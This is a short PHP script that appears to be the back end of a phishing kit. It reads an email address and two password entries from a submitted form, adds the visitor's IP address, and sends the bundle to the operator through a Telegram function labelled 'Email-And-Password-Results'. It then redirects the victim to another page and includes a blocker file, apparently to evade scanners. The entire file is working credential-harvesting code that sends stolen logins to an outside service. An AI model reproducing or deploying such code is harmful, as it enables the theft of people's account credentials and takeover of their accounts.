<?php
include '../blocker.php';
include 'config.php';
$ip = getenv("REMOTE_ADDR");
$message .= "Email Address: " .$_POST['1']."\n\n";
$message .= "Password: " .$_POST['2']."\n\n";
$message .= "Password 2: " .$_POST['3']."\n\n";
$message .= "-------------------------------------------------\n";
$message .= "Client IP : ".$ip."\n";
$message .= "HostName : ".$hostname."\n";
$rnessage = "$message\n";
$message .= "----Edd--Email---Address----Mad------\n";
$subject = "Email-And-Password-Results\r\n\r\n".$message;
send_telegram_msg($message);
header("Location: +_++_=-.htm");


?>